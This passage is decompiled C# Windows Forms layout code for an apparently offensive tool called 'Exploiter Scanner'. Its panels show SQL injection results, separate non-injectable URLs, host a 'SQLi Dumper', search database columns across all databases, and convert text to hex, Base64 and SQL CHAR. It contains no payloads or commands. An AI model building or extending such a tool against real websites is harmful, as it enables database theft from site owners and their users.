		this.mnuScannerDomain.ShowImageMargin = false;
		this.mnuScannerDomain.ShowItemToolTips = false;
		this.mnuScannerDomain.Size = new System.Drawing.Size(90, 34);
		this.ScannerDomainEdit.Name = "ScannerDomainEdit";
		this.ScannerDomainEdit.Size = new System.Drawing.Size(89, 30);
		this.ScannerDomainEdit.Text = "Edit";
		this.TabPage5.Controls.Add(this.btnExcludeUrlWords);
		this.TabPage5.Controls.Add(this.lstExcludeUrlWords);
		this.TabPage5.Controls.Add(this.txtExcludeUrlWords);
		this.TabPage5.Controls.Add(this.lblSkipWordURL);
		this.TabPage5.Location = new System.Drawing.Point(4, 29);
		this.TabPage5.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.TabPage5.Name = "TabPage5";
		this.TabPage5.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.TabPage5.Size = new System.Drawing.Size(565, 170);
		this.TabPage5.TabIndex = 1;
		this.TabPage5.Text = "URL BlackList";
		this.TabPage5.UseVisualStyleBackColor = true;
		this.ntfTray.BalloonTipIcon = System.Windows.Forms.ToolTipIcon.Info;
		this.ntfTray.BalloonTipTitle = "Exploiter Scanner Info";
		this.ntfTray.Text = "Exploiter Scanner";
		this.numThreads.BackColor = System.Drawing.SystemColors.Window;
		this.numThreads.Location = new System.Drawing.Point(2146, 698);
		this.numThreads.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.numThreads.Maximum = new decimal(new int[4] { 10, 0, 0, 0 });
		this.numThreads.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
		this.numThreads.Name = "numThreads";
		this.numThreads.Size = new System.Drawing.Size(94, 26);
		this.numThreads.TabIndex = 28;
		this.numThreads.Value = new decimal(new int[4] { 1, 0, 0, 0 });
		this.tsWorker.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.tsWorker.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsWorker.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.tsWorker.Items.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.btnStart, this.btnPause, this.btnPauseSP, this.btnStop, this.prbMainStatus });
		this.tsWorker.Location = new System.Drawing.Point(0, 979);
		this.tsWorker.Name = "tsWorker";
		this.tsWorker.Padding = new System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsWorker.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.tsWorker.ShowItemToolTips = false;
		this.tsWorker.Size = new System.Drawing.Size(2583, 32);
		this.tsWorker.TabIndex = 36;
		this.btnStart.Image = ns0.Class6.Run_16x_24;
		this.btnStart.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnStart.Name = "btnStart";
		this.btnStart.Size = new System.Drawing.Size(76, 29);
		this.btnStart.Text = "&Start";
		this.btnStart.ToolTipText = "Start Worker";
		this.btnPause.CheckOnClick = true;
		this.btnPause.Image = ns0.Class6.Pause_16x_24;
		this.btnPause.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnPause.Name = "btnPause";
		this.btnPause.Size = new System.Drawing.Size(85, 29);
		this.btnPause.Text = "&Pause";
		this.btnPause.ToolTipText = "Pause Worker";
		this.btnPauseSP.Name = "btnPauseSP";
		this.btnPauseSP.Size = new System.Drawing.Size(6, 32);
		this.btnStop.Image = ns0.Class6.Stop_16x_24;
		this.btnStop.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnStop.Name = "btnStop";
		this.btnStop.Size = new System.Drawing.Size(77, 29);
		this.btnStop.Text = "&Stop";
		this.btnStop.ToolTipText = "Stop Worker";
		this.prbMainStatus.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.prbMainStatus.AutoSize = false;
		this.prbMainStatus.Name = "prbMainStatus";
		this.prbMainStatus.Size = new System.Drawing.Size(200, 22);
		this.prbMainStatus.Visible = false;
		this.pnlSQLi.AutoScroll = true;
		this.pnlSQLi.Controls.Add(this.dtgSQLi);
		this.pnlSQLi.Controls.Add(this.tsSearchColumn);
		this.pnlSQLi.Controls.Add(this.tsSQLi);
		this.pnlSQLi.Location = new System.Drawing.Point(267, 787);
		this.pnlSQLi.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.pnlSQLi.Name = "pnlSQLi";
		this.pnlSQLi.Size = new System.Drawing.Size(1148, 135);
		this.pnlSQLi.TabIndex = 37;
		this.pnlSQLi.Visible = false;
		this.dtgSQLi.AllowUserToAddRows = false;
		this.dtgSQLi.AllowUserToDeleteRows = false;
		this.dtgSQLi.AllowUserToOrderColumns = true;
		this.dtgSQLi.AllowUserToResizeRows = false;
		this.dtgSQLi.BackgroundColor = System.Drawing.SystemColors.Window;
		this.dtgSQLi.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
		this.dtgSQLi.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dtgSQLi.Columns.AddRange(this.Column6, this.Column7, this.Column8, this.Column9, this.Column10, this.Column11, this.Column12, this.Column13, this.Column16);
		this.dtgSQLi.Dock = System.Windows.Forms.DockStyle.Fill;
		this.dtgSQLi.EditMode = System.Windows.Forms.DataGridViewEditMode.EditOnF2;
		this.dtgSQLi.Location = new System.Drawing.Point(0, 33);
		this.dtgSQLi.Name = "dtgSQLi";
		this.dtgSQLi.RowHeadersVisible = false;
		this.dtgSQLi.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.dtgSQLi.ShowCellErrors = false;
		this.dtgSQLi.ShowEditingIcon = false;
		this.dtgSQLi.ShowRowErrors = false;
		this.dtgSQLi.Size = new System.Drawing.Size(1148, 69);
		this.dtgSQLi.TabIndex = 38;
		this.Column6.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.Column6.HeaderText = "";
		this.Column6.Name = "Column6";
		this.Column6.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.Column6.Width = 5;
		this.Column7.HeaderText = "URL";
		this.Column7.Name = "Column7";
		this.Column7.Resizable = System.Windows.Forms.DataGridViewTriState.True;
		this.Column7.Width = 420;
		this.Column8.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.Column8.HeaderText = "Type";
		this.Column8.Name = "Column8";
		this.Column8.ReadOnly = true;
		this.Column8.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.Column8.Width = 79;
		this.Column9.HeaderText = "SQL Version";
		this.Column9.Name = "Column9";
		this.Column9.Width = 135;
		this.Column10.HeaderText = "Highlight";
		this.Column10.Name = "Column10";
		this.Column10.Width = 150;
		this.Column11.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.Column11.HeaderText = "Country";
		this.Column11.Name = "Column11";
		this.Column11.ReadOnly = true;
		this.Column11.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.Column12.HeaderText = "Search Column";
		this.Column12.Name = "Column12";
		this.Column12.Resizable = System.Windows.Forms.DataGridViewTriState.True;
		this.Column12.Width = 200;
		this.Column13.HeaderText = "Last Check";
		this.Column13.Name = "Column13";
		this.Column13.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.Column13.Width = 155;
		this.Column16.HeaderText = "Comments";
		this.Column16.Name = "Column16";
		this.tsSearchColumn.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.tsSearchColumn.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsSearchColumn.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.tsSearchColumn.Items.AddRange(new System.Windows.Forms.ToolStripItem[19]
		{
			this.btnSearchColumnStart, this.cmbSearchColumnType, this.ToolStripSeparator3, this.chkSearchColumn, this.cmbSearchColumn, this.chkSearchColumn2, this.cmbSearchColumn2, this.chkSearchColumn3, this.cmbSearchColumn3, this.chkSearchColumn4,
			this.cmbSearchColumn4, this.ToolStripSeparator21, this.chkSearchColumnAllDBs, this.ToolStripSeparator18, this.lblSearchColumnThreads, this.btnSearchColumnPause, this.btnSearchColumnSP, this.btnSearchColumnStop, this.prbSearchColumn
		});
		this.tsSearchColumn.Location = new System.Drawing.Point(0, 102);
		this.tsSearchColumn.Name = "tsSearchColumn";
		this.tsSearchColumn.Padding = new System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsSearchColumn.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.tsSearchColumn.ShowItemToolTips = false;
		this.tsSearchColumn.Size = new System.Drawing.Size(1148, 33);
		this.tsSearchColumn.TabIndex = 37;
		this.btnSearchColumnStart.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.btnSearchColumnStart.Enabled = false;
		this.btnSearchColumnStart.Image = ns0.Class6.Run_16x_24;
		this.btnSearchColumnStart.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnSearchColumnStart.Name = "btnSearchColumnStart";
		this.btnSearchColumnStart.Size = new System.Drawing.Size(133, 30);
		this.btnSearchColumnStart.Text = "&Start Search";
		this.btnSearchColumnStart.ToolTipText = "Start Checker";
		this.cmbSearchColumnType.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbSearchColumnType.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.cmbSearchColumnType.Name = "cmbSearchColumnType";
		this.cmbSearchColumnType.Size = new System.Drawing.Size(126, 33);
		this.cmbSearchColumnType.Visible = false;
		this.ToolStripSeparator3.Name = "ToolStripSeparator3";
		this.ToolStripSeparator3.Size = new System.Drawing.Size(6, 33);
		this.ToolStripSeparator3.Visible = false;
		this.chkSearchColumn.Checked = true;
		this.chkSearchColumn.CheckOnClick = true;
		this.chkSearchColumn.CheckState = System.Windows.Forms.CheckState.Checked;
		this.chkSearchColumn.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
		this.chkSearchColumn.Image = (System.Drawing.Image)resources.GetObject("chkSearchColumn.Image");
		this.chkSearchColumn.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.chkSearchColumn.Name = "chkSearchColumn";
		this.chkSearchColumn.Size = new System.Drawing.Size(28, 30);
		this.chkSearchColumn.Text = "+";
		this.cmbSearchColumn.Name = "cmbSearchColumn";
		this.cmbSearchColumn.Size = new System.Drawing.Size(120, 33);
		this.chkSearchColumn2.CheckOnClick = true;
		this.chkSearchColumn2.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
		this.chkSearchColumn2.Image = (System.Drawing.Image)resources.GetObject("chkSearchColumn2.Image");
		this.chkSearchColumn2.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.chkSearchColumn2.Name = "chkSearchColumn2";
		this.chkSearchColumn2.Size = new System.Drawing.Size(28, 30);
		this.chkSearchColumn2.Text = "+";
		this.cmbSearchColumn2.Name = "cmbSearchColumn2";
		this.cmbSearchColumn2.Size = new System.Drawing.Size(75, 33);
		this.chkSearchColumn3.CheckOnClick = true;
		this.chkSearchColumn3.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
		this.chkSearchColumn3.Image = (System.Drawing.Image)resources.GetObject("chkSearchColumn3.Image");
		this.chkSearchColumn3.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.chkSearchColumn3.Name = "chkSearchColumn3";
		this.chkSearchColumn3.Size = new System.Drawing.Size(28, 30);
		this.chkSearchColumn3.Text = "+";
		this.cmbSearchColumn3.Name = "cmbSearchColumn3";
		this.cmbSearchColumn3.Size = new System.Drawing.Size(91, 33);
		this.chkSearchColumn4.CheckOnClick = true;
		this.chkSearchColumn4.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
		this.chkSearchColumn4.Image = (System.Drawing.Image)resources.GetObject("chkSearchColumn4.Image");
		this.chkSearchColumn4.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.chkSearchColumn4.Name = "chkSearchColumn4";
		this.chkSearchColumn4.Size = new System.Drawing.Size(28, 30);
		this.chkSearchColumn4.Text = "+";
		this.cmbSearchColumn4.Name = "cmbSearchColumn4";
		this.cmbSearchColumn4.Size = new System.Drawing.Size(120, 33);
		this.ToolStripSeparator21.Name = "ToolStripSeparator21";
		this.ToolStripSeparator21.Size = new System.Drawing.Size(6, 33);
		this.chkSearchColumnAllDBs.CheckOnClick = true;
		this.chkSearchColumnAllDBs.Image = ns0.Class6.DatabaseSchema_16x_24;
		this.chkSearchColumnAllDBs.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.chkSearchColumnAllDBs.Name = "chkSearchColumnAllDBs";
		this.chkSearchColumnAllDBs.Size = new System.Drawing.Size(146, 30);
		this.chkSearchColumnAllDBs.Text = "All DataBases";
		this.ToolStripSeparator18.Name = "ToolStripSeparator18";
		this.ToolStripSeparator18.Size = new System.Drawing.Size(6, 33);
		this.lblSearchColumnThreads.Name = "lblSearchColumnThreads";
		this.lblSearchColumnThreads.Size = new System.Drawing.Size(74, 30);
		this.lblSearchColumnThreads.Text = "Threads";
		this.btnSearchColumnPause.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.btnSearchColumnPause.CheckOnClick = true;
		this.btnSearchColumnPause.Image = ns0.Class6.Pause_16x_24;
		this.btnSearchColumnPause.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnSearchColumnPause.Name = "btnSearchColumnPause";
		this.btnSearchColumnPause.Size = new System.Drawing.Size(85, 30);
		this.btnSearchColumnPause.Text = "&Pause";
		this.btnSearchColumnPause.ToolTipText = "Pause Worker";
		this.btnSearchColumnPause.Visible = false;
		this.btnSearchColumnSP.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.btnSearchColumnSP.Name = "btnSearchColumnSP";
		this.btnSearchColumnSP.Size = new System.Drawing.Size(6, 33);
		this.btnSearchColumnSP.Visible = false;
		this.btnSearchColumnStop.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.btnSearchColumnStop.Image = ns0.Class6.Stop_16x_24;
		this.btnSearchColumnStop.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnSearchColumnStop.Name = "btnSearchColumnStop";
		this.btnSearchColumnStop.Size = new System.Drawing.Size(77, 30);
		this.btnSearchColumnStop.Text = "&Stop";
		this.btnSearchColumnStop.ToolTipText = "Stop Worker";
		this.btnSearchColumnStop.Visible = false;
		this.prbSearchColumn.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.prbSearchColumn.AutoSize = false;
		this.prbSearchColumn.Name = "prbSearchColumn";
		this.prbSearchColumn.Size = new System.Drawing.Size(133, 14);
		this.prbSearchColumn.Visible = false;
		this.tsSQLi.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsSQLi.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.tsSQLi.Items.AddRange(new System.Windows.Forms.ToolStripItem[7] { this.cmbSQLiFilter, this.cmbSQLiSearch, this.btnSQLiSearchClear, this.txtSQLiSearch, this.btnSQLiSearch, this.ToolStripSeparator12, this.lblSQLi });
		this.tsSQLi.Location = new System.Drawing.Point(0, 0);
		this.tsSQLi.Name = "tsSQLi";
		this.tsSQLi.Padding = new System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsSQLi.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.tsSQLi.ShowItemToolTips = false;
		this.tsSQLi.Size = new System.Drawing.Size(1148, 33);
		this.tsSQLi.TabIndex = 3;
		this.tsSQLi.Text = "ToolStrip2";
		this.cmbSQLiFilter.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbSQLiFilter.Name = "cmbSQLiFilter";
		this.cmbSQLiFilter.Size = new System.Drawing.Size(110, 33);
		this.cmbSQLiSearch.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbSQLiSearch.Name = "cmbSQLiSearch";
		this.cmbSQLiSearch.Size = new System.Drawing.Size(160, 33);
		this.btnSQLiSearchClear.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnSQLiSearchClear.Image = ns0.Class6.delete;
		this.btnSQLiSearchClear.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnSQLiSearchClear.Name = "btnSQLiSearchClear";
		this.btnSQLiSearchClear.Size = new System.Drawing.Size(28, 30);
		this.btnSQLiSearchClear.Text = "Clear";
		this.txtSQLiSearch.Name = "txtSQLiSearch";
		this.txtSQLiSearch.Size = new System.Drawing.Size(148, 33);
		this.btnSQLiSearch.Image = ns0.Class6.SearchContract_16x_24;
		this.btnSQLiSearch.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnSQLiSearch.Name = "btnSQLiSearch";
		this.btnSQLiSearch.Size = new System.Drawing.Size(92, 30);
		this.btnSQLiSearch.Text = "Search";
		this.ToolStripSeparator12.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.ToolStripSeparator12.Name = "ToolStripSeparator12";
		this.ToolStripSeparator12.Size = new System.Drawing.Size(6, 33);
		this.lblSQLi.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.lblSQLi.Name = "lblSQLi";
		this.lblSQLi.Size = new System.Drawing.Size(67, 30);
		this.lblSQLi.Text = "lblSQLi";
		this.mnuSearchColumn.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.mnuSearchColumn.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.mnuSearchColumnRem, this.mnuSearchColumnClear });
		this.mnuSearchColumn.Name = "mnuChecked";
		this.mnuSearchColumn.ShowImageMargin = false;
		this.mnuSearchColumn.ShowItemToolTips = false;
		this.mnuSearchColumn.Size = new System.Drawing.Size(124, 64);
		this.mnuSearchColumnRem.Name = "mnuSearchColumnRem";
		this.mnuSearchColumnRem.Size = new System.Drawing.Size(123, 30);
		this.mnuSearchColumnRem.Text = "Remove";
		this.mnuSearchColumnClear.Name = "mnuSearchColumnClear";
		this.mnuSearchColumnClear.Size = new System.Drawing.Size(123, 30);
		this.mnuSearchColumnClear.Text = "Clear";
		this.pnlSQLiNoInjectable.AutoScroll = true;
		this.pnlSQLiNoInjectable.Controls.Add(this.dtgSQLiNoInjectable);
		this.pnlSQLiNoInjectable.Controls.Add(this.tsSQLiNoInjectable);
		this.pnlSQLiNoInjectable.Location = new System.Drawing.Point(267, 659);
		this.pnlSQLiNoInjectable.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.pnlSQLiNoInjectable.Name = "pnlSQLiNoInjectable";
		this.pnlSQLiNoInjectable.Size = new System.Drawing.Size(612, 118);
		this.pnlSQLiNoInjectable.TabIndex = 38;
		this.pnlSQLiNoInjectable.Visible = false;
		this.dtgSQLiNoInjectable.AllowUserToAddRows = false;
		this.dtgSQLiNoInjectable.AllowUserToDeleteRows = false;
		this.dtgSQLiNoInjectable.AllowUserToOrderColumns = true;
		this.dtgSQLiNoInjectable.AllowUserToResizeRows = false;
		this.dtgSQLiNoInjectable.BackgroundColor = System.Drawing.SystemColors.Window;
		this.dtgSQLiNoInjectable.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
		this.dtgSQLiNoInjectable.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dtgSQLiNoInjectable.Columns.AddRange(this.DataGridViewImageColumn2, this.DataGridViewTextBoxColumn4, this.DataGridViewTextBoxColumn5, this.DataGridViewTextBoxColumn7, this.DataGridViewTextBoxColumn9, this.Column17);
		this.dtgSQLiNoInjectable.Dock = System.Windows.Forms.DockStyle.Fill;
		this.dtgSQLiNoInjectable.EditMode = System.Windows.Forms.DataGridViewEditMode.EditOnF2;
		this.dtgSQLiNoInjectable.Location = new System.Drawing.Point(0, 33);
		this.dtgSQLiNoInjectable.Name = "dtgSQLiNoInjectable";
		this.dtgSQLiNoInjectable.RowHeadersVisible = false;
		this.dtgSQLiNoInjectable.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.dtgSQLiNoInjectable.ShowCellErrors = false;
		this.dtgSQLiNoInjectable.ShowEditingIcon = false;
		this.dtgSQLiNoInjectable.ShowRowErrors = false;
		this.dtgSQLiNoInjectable.Size = new System.Drawing.Size(612, 85);
		this.dtgSQLiNoInjectable.TabIndex = 40;
		this.DataGridViewImageColumn2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewImageColumn2.HeaderText = "";
		this.DataGridViewImageColumn2.Name = "DataGridViewImageColumn2";
		this.DataGridViewImageColumn2.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.DataGridViewImageColumn2.Width = 5;
		this.DataGridViewTextBoxColumn4.HeaderText = "URL";
		this.DataGridViewTextBoxColumn4.Name = "DataGridViewTextBoxColumn4";
		this.DataGridViewTextBoxColumn4.Resizable = System.Windows.Forms.DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn4.Width = 400;
		this.DataGridViewTextBoxColumn5.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewTextBoxColumn5.HeaderText = "Type";
		this.DataGridViewTextBoxColumn5.Name = "DataGridViewTextBoxColumn5";
		this.DataGridViewTextBoxColumn5.ReadOnly = true;
		this.DataGridViewTextBoxColumn5.Resizable = System.Windows.Forms.DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn5.Width = 79;
		this.DataGridViewTextBoxColumn7.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewTextBoxColumn7.HeaderText = "Country";
		this.DataGridViewTextBoxColumn7.Name = "DataGridViewTextBoxColumn7";
		this.DataGridViewTextBoxColumn7.ReadOnly = true;
		this.DataGridViewTextBoxColumn7.Resizable = System.Windows.Forms.DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn9.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewTextBoxColumn9.FillWeight = 120f;
		this.DataGridViewTextBoxColumn9.HeaderText = "Checked";
		this.DataGridViewTextBoxColumn9.Name = "DataGridViewTextBoxColumn9";
		this.DataGridViewTextBoxColumn9.ReadOnly = true;
		this.DataGridViewTextBoxColumn9.Resizable = System.Windows.Forms.DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn9.Width = 108;
		this.Column17.HeaderText = "Comments";
		this.Column17.Name = "Column17";
		this.tsSQLiNoInjectable.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsSQLiNoInjectable.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.tsSQLiNoInjectable.Items.AddRange(new System.Windows.Forms.ToolStripItem[7] { this.cmbSQLiNoInjectableFilter, this.cmbSQLiNoInjectableSearch, this.btnSQLiNoInjectableSearchClear, this.txtSQLiNoInjectableSearch, this.btnSQLiNoInjectableSearch, this.ToolStripSeparator13, this.lblSQLiNoInjectable });
		this.tsSQLiNoInjectable.Location = new System.Drawing.Point(0, 0);
		this.tsSQLiNoInjectable.Name = "tsSQLiNoInjectable";
		this.tsSQLiNoInjectable.Padding = new System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsSQLiNoInjectable.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.tsSQLiNoInjectable.ShowItemToolTips = false;
		this.tsSQLiNoInjectable.Size = new System.Drawing.Size(612, 33);
		this.tsSQLiNoInjectable.TabIndex = 3;
		this.tsSQLiNoInjectable.Text = "ToolStrip2";
		this.cmbSQLiNoInjectableFilter.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbSQLiNoInjectableFilter.Name = "cmbSQLiNoInjectableFilter";
		this.cmbSQLiNoInjectableFilter.Size = new System.Drawing.Size(110, 33);
		this.cmbSQLiNoInjectableSearch.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbSQLiNoInjectableSearch.Name = "cmbSQLiNoInjectableSearch";
		this.cmbSQLiNoInjectableSearch.Size = new System.Drawing.Size(160, 33);
		this.btnSQLiNoInjectableSearchClear.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnSQLiNoInjectableSearchClear.Image = ns0.Class6.delete;
		this.btnSQLiNoInjectableSearchClear.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnSQLiNoInjectableSearchClear.Name = "btnSQLiNoInjectableSearchClear";
		this.btnSQLiNoInjectableSearchClear.Size = new System.Drawing.Size(28, 30);
		this.btnSQLiNoInjectableSearchClear.Text = "Clear";
		this.txtSQLiNoInjectableSearch.Name = "txtSQLiNoInjectableSearch";
		this.txtSQLiNoInjectableSearch.Size = new System.Drawing.Size(148, 33);
		this.btnSQLiNoInjectableSearch.Image = ns0.Class6.SearchContract_16x_24;
		this.btnSQLiNoInjectableSearch.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnSQLiNoInjectableSearch.Name = "btnSQLiNoInjectableSearch";
		this.btnSQLiNoInjectableSearch.Size = new System.Drawing.Size(92, 30);
		this.btnSQLiNoInjectableSearch.Text = "Search";
		this.ToolStripSeparator13.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.ToolStripSeparator13.Name = "ToolStripSeparator13";
		this.ToolStripSeparator13.Size = new System.Drawing.Size(6, 33);
		this.lblSQLiNoInjectable.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.lblSQLiNoInjectable.Name = "lblSQLiNoInjectable";
		this.lblSQLiNoInjectable.Size = new System.Drawing.Size(166, 25);
		this.lblSQLiNoInjectable.Text = "lblSQLiNoInjectable";
		this.pnlSQLiDumper.Location = new System.Drawing.Point(2144, 520);
		this.pnlSQLiDumper.Name = "pnlSQLiDumper";
		this.pnlSQLiDumper.Size = new System.Drawing.Size(146, 32);
		this.pnlSQLiDumper.TabIndex = 347;
		this.mnuDownloads.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.mnuDownloads.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.mnuDownloadsClear });
		this.mnuDownloads.Name = "mnuChecked";
		this.mnuDownloads.ShowImageMargin = false;
		this.mnuDownloads.ShowItemToolTips = false;
		this.mnuDownloads.Size = new System.Drawing.Size(102, 34);
		this.mnuDownloadsClear.Name = "mnuDownloadsClear";
		this.mnuDownloadsClear.Size = new System.Drawing.Size(101, 30);
		this.mnuDownloadsClear.Text = "Reset";
		this.pnlTools.AutoScroll = true;
		this.pnlTools.Controls.Add(this.btnToolsClean);
		this.pnlTools.Controls.Add(this.grbToolsConvertEnc);
		this.pnlTools.Controls.Add(this.grbToolsIP);
		this.pnlTools.Location = new System.Drawing.Point(2144, 18);
		this.pnlTools.Name = "pnlTools";
		this.pnlTools.Size = new System.Drawing.Size(620, 349);
		this.pnlTools.TabIndex = 41;
		this.btnToolsClean.Location = new System.Drawing.Point(444, 740);
		this.btnToolsClean.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.btnToolsClean.Name = "btnToolsClean";
		this.btnToolsClean.Size = new System.Drawing.Size(129, 35);
		this.btnToolsClean.TabIndex = 95;
		this.btnToolsClean.Text = "Clear Form";
		this.btnToolsClean.UseVisualStyleBackColor = true;
		this.grbToolsConvertEnc.Controls.Add(this.btnBase64ToText);
		this.grbToolsConvertEnc.Controls.Add(this.btnTextToBase64);
		this.grbToolsConvertEnc.Controls.Add(this.btnURLDecondingToText);
		this.grbToolsConvertEnc.Controls.Add(this.btnTextToURLEnconding);
		this.grbToolsConvertEnc.Controls.Add(this.txtTextValue);
		this.grbToolsConvertEnc.Controls.Add(this.cmbSQLChar);
		this.grbToolsConvertEnc.Controls.Add(this.butTextToSQLChar);
		this.grbToolsConvertEnc.Controls.Add(this.txtSQLCharDelimiter);
		this.grbToolsConvertEnc.Controls.Add(this.chkGroupChar);
		this.grbToolsConvertEnc.Controls.Add(this.btnHexToText);
		this.grbToolsConvertEnc.Controls.Add(this.txtSQLCharValue);
		this.grbToolsConvertEnc.Controls.Add(this.lblToolsConvertHexValue);
		this.grbToolsConvertEnc.Controls.Add(this.lblToolsConverSQLChar);
		this.grbToolsConvertEnc.Controls.Add(this.txtHexValue);
		this.grbToolsConvertEnc.Controls.Add(this.lblToolsConvertTextValue);
		this.grbToolsConvertEnc.Controls.Add(this.btnConvertTextToHex);
		this.grbToolsConvertEnc.Location = new System.Drawing.Point(4, 9);
		this.grbToolsConvertEnc.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbToolsConvertEnc.Name = "grbToolsConvertEnc";
		this.grbToolsConvertEnc.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbToolsConvertEnc.Size = new System.Drawing.Size(579, 554);
		this.grbToolsConvertEnc.TabIndex = 94;
		this.grbToolsConvertEnc.TabStop = false;
		this.grbToolsConvertEnc.Text = "Encoding \\ Deconding";
		this.btnBase64ToText.Enabled = false;
		this.btnBase64ToText.ForeColor = System.Drawing.SystemColors.ControlText;
		this.btnBase64ToText.Location = new System.Drawing.Point(372, 503);
		this.btnBase64ToText.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.btnBase64ToText.Name = "btnBase64ToText";
		this.btnBase64ToText.Size = new System.Drawing.Size(195, 34);
		this.btnBase64ToText.TabIndex = 97;
		this.btnBase64ToText.Text = " Base64 to Text";
		this.btnBase64ToText.UseVisualStyleBackColor = true;
		this.btnTextToBase64.Enabled = false;
		this.btnTextToBase64.ForeColor = System.Drawing.SystemColors.ControlText;
		this.btnTextToBase64.Location = new System.Drawing.Point(170, 503);
		this.btnTextToBase64.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.btnTextToBase64.Name = "btnTextToBase64";
		this.btnTextToBase64.Size = new System.Drawing.Size(195, 34);
